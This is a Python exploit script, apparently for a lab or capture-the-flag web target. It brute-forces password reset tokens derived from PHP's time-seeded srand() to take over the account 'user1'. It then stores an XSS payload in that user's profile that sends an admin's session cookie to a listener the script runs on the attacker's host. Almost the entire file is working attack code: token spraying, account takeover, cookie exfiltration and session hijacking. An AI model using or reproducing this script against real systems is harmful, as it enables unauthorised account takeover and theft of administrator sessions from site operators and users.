#!/usr/bin/env python3

import argparse
import traceback
import requests
import http.server
import asyncio
import socketserver
import threading
import time
import sys
import os
import signal
from urllib.parse import urlparse, parse_qs, urljoin
import subprocess

# Global variables
admin_token_received = False
server_running = False

def tokenSpray(target):
    """
    Request password reset token for user `user1`
    """
    passRstUrl = urljoin(target, "/forgotpassword.php")
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    passRstData = {"username": "user1"}

    try:
        epoch_time_milis_start = int(time.time() * 1000)
        passRstRes = requests.post(passRstUrl, headers=headers, data=passRstData)
        epoch_time_milis_end = int(time.time() * 1000)

        if "Email sent!" not in passRstRes.text:
            print("[-] Failed to request the password reset token")
            return

        print("[+] Password reset token requested successfully")
        print(f"[*] Password reset token time interval: {epoch_time_milis_start} ... {epoch_time_milis_end}")
        # --- Generate password reset token list ---
        try:
            GenTknLstCommand = f"php genTokenList.php {epoch_time_milis_start} {epoch_time_milis_end}"
            print(f"[*] Executing: {GenTknLstCommand}")
            result = subprocess.run(GenTknLstCommand, shell=True, check=True, capture_output=True, text=True)
            print(result.stdout.strip())

        except FileNotFoundError as e:
            print("[-] genTokenList.php file not found:", e)
            return
        except subprocess.CalledProcessError as e:
            print("[-] Command failed with return code:", e.returncode)
            if e.stderr:
                print("[-] Error output:", e.stderr)
            return
        except Exception as e:
            print("[-] Unexpected error during token list generation:", e)
            traceback.print_exc()
            return

        # --- Bruteforce the correct password reset token ---
        print("[*] Starting token spray attack. Standby")
        token_count = 0
        try:
            with open("tokens.txt", "r") as file:
                for token in file:
                    token = token.rstrip()
                    token_count += 1
                    if token_count % 100 == 0:
                        print(f"[*] Tested {token_count} tokens...")

                    PassRstCfrmUrl = urljoin(target, "/resetpassword.php")
                    newPassword = "Password!1234"
                    PassRstCfrmData = {"token": token, "password1": newPassword, "password2": newPassword}

                    try:
                        PassRstCfrmRes = requests.post(PassRstCfrmUrl, headers=headers, data=PassRstCfrmData, allow_redirects=False)
                        if "Token is invalid." not in PassRstCfrmRes.text and "Password changed!" in PassRstCfrmRes.text:
                            print("[+] Valid password reset token:", token)
                            print(f"[+] Password for user `user1` was changed successfully. New password: {newPassword}")
                            """
                            Login
                            """
                            lgnUrl = urljoin(target, "/login.php")
                            lgnData = {"username": "user1", "password": f"{newPassword}"}
                            lgnRes = requests.post(lgnUrl, headers=headers, data=lgnData, allow_redirects=False)
                            if 'PHPSESSID' in lgnRes.cookies and lgnRes.status_code==302:
                                PHPSESSID_value = lgnRes.cookies['PHPSESSID']
                                print("[+] Logged in successfully")
                                print(f"[+] Cookie: PHPSESSID={PHPSESSID_value}")
                                return PHPSESSID_value
                            else:
                                print("[-] Could not extract PHPSESSID from cookies")
                                return None

                    except Exception as e:
                        print(f"[-] Error testing token {token}: {e}")

            print(f"[-] No valid token found after testing {token_count} tokens")

        except FileNotFoundError:
            print("[-] tokens.txt file not found")
        except Exception as e:
            print("[-] Unexpected error during token spraying:", e)
            traceback.print_exc()

    except Exception as e:
        print("[-] Error sending the password reset request:", e)
        traceback.print_exc()


class TokenHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        global admin_token_received

        if self.path.startswith('/token?PHPSESSID='):
            try:
                parsed_url = urlparse(self.path)
                query_params = parse_qs(parsed_url.query)
                admin_token = query_params.get('PHPSESSID', [''])[0]

                if admin_token:
                    print(f"\n[+] Admin session received: {admin_token}")

                    with open("admin_token.txt", "w", encoding="utf-8") as f:
                        f.write(admin_token)

                    admin_token_received = True

                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(b'Session received successfully!')
                else:
                    print("[-] Empty admin session received")
                    self.send_error(400, "Empty session")

            except Exception as e:
                print(f"[-] Error processing session: {e}")
                self.send_error(500, "Server error")
        else:
            super().do_GET()


def start_http_server(port=1337, timeout=300):
    global server_running
    try:
        with socketserver.TCPServer(("", port), TokenHandler) as httpd:
            server_running = True
            print(f"[+] HTTP Server started on port {port}")
            print(f"[+] Waiting for admin token (timeout: {timeout}s)...")

            httpd.timeout = 1
            start_time = time.time()

            while server_running and (time.time() - start_time) < timeout:
                httpd.handle_request()
                if admin_token_received:
                    print("[+] Token received, shutting down server")
                    break

            if not admin_token_received:
                print(f"[-] Timeout reached ({timeout}s), no token received")

    except PermissionError:
        print(f"[-] Permission denied for port {port}. Try running as root/administrator")
    except OSError as e:
        if e.errno == 98:
            print(f"[-] Port {port} is already in use")
        else:
            print(f"[-] Error starting HTTP server: {e}")
    except Exception as e:
        print(f"[-] Unexpected server error: {e}")
    finally:
        server_running = False

def deliverXss(target, lhost, nrmlUsrSession, server_port = 1337):
    xssUrl = urljoin(target, "profile.php")
    cookies = {"PHPSESSID": nrmlUsrSession}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    xssPayload = f"'\"><script>document.write('<img src=http://{lhost}:{server_port}/token?'+document.cookie+' />');</script>"
    xssData = {"description": f"{xssPayload}"}
    try:
        xssRes = requests.post(xssUrl, headers=headers, cookies=cookies, data=xssData)
        if "Success" in xssRes.text:
            print("[+] XSS Payload Delivered Successfully")
        else:
            print("[-] Failed to deliver the XSS payload")
    except Exception as e:
        print("[-] Error updating the account description: ", e)
        traceback.print_exc()

def xssExp(target, lhost, normal_user_session_cookie, server_port=1337):
    server_thread = threading.Thread(target=start_http_server, args=(server_port, 300), daemon=True)
    server_thread.start()

    while not server_running:
        time.sleep(0.1)

    deliverXss(target, lhost, normal_user_session_cookie) # Send XSS payload 

    print("[+] Waiting for admin session...")

    timeout = 300
    start_time = time.time()

    while time.time() - start_time < timeout and not admin_token_received:
        time.sleep(1)

    if admin_token_received:
        print("[+] Admin session successfully exfiltrated!")
        return True
    else:
        print("[-] Timeout waiting for admin token")
        return False

def signal_handler(sig, frame):
    global server_running
    print("\n[*] Shutting down...")
    server_running = False
    sys.exit(0)


def main():
    parser = argparse.ArgumentParser(description="Exploit the PHP `srand()` insecure random number generator to brute-force the password reset token and change the account's password. XSS to Hijack Admin's Session Cookie.")
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.174.234:80/)")
    parser.add_argument("lhost", help='Attacker IP address')

    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    norml_user_session = tokenSpray(args.target)
    try:
        success = xssExp(args.target, args.lhost, norml_user_session)

        if success:
            print("[+] Exploit completed successfully!")
            if os.path.exists("admin_token.txt"):
                with open("admin_token.txt", "r", encoding="utf-8") as f:
                    content = f.read().strip()
                    print(content)
                    adminSession = content.split(";")[0]  # Take the first part before the semicolon
                    print(f"[+] Admin token saved to admin_token.txt: {adminSession}")
            return 0
        else:
            print("[-] Exploit failed")
            return 1
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())
